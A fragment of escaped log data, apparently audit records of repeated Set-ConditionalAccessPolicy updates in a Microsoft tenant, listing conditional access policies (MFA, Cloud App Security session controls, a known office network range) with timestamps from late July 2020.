'{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/25/2020 2:21:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/25/2020 5:37:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/25/2020 5:37:51 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/26/2020 2:25:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/26/2020 2:25:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/26/2020 2:25:48 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/26/2020 2:25:48 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/26/2020 5:09:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/26/2020 5:09:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/27/2020 2:07:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/27/2020 2:07:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/27/2020 5:11:30 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/27/2020 5:11:29 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/28/2020 2:00:46 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/28/2020 2:00:45 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:30 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:28 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:29 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/28/2020 5:23:31 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/29/2020 1:40:54 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/29/2020 1:40:54 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/29/2020 1:40:52 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/29/2020 1:40:53 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/29/2020 5:15:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/29/2020 5:15:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/29/2020 5:15:40 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/29/2020 5:15:40 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 